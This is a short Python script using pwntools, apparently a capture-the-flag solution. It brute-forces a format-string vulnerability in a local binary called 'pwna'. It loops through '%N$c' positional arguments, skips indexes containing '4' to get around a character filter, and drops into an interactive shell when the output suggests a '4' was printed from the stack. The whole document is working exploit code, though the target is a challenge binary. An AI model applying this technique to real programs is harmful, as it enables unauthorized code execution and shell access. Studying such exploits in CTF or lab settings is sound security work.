#!/bin/python3

from pwn import *
context(arch="amd64")

for i in range(1,512): 
    # strchr() check equivalent
    if '4' in str(i):
        # skip it
        continue

    print("[*] Trying with", i, ":")
    p = process(["./pwna", b'%' + str(i).encode('utf-8') + b'$c'])

    try:
        print("[+] Output", p.recv())
        p.close()
    except:
        # if line can't be printed, it SHOULD be because we successfully printed '4' (because we found 0x34 value somewhere on the stack) and obtained a shell!
        p.interactive()
        p.close()

print("Looks like you were unlucky my friend, try again :(")
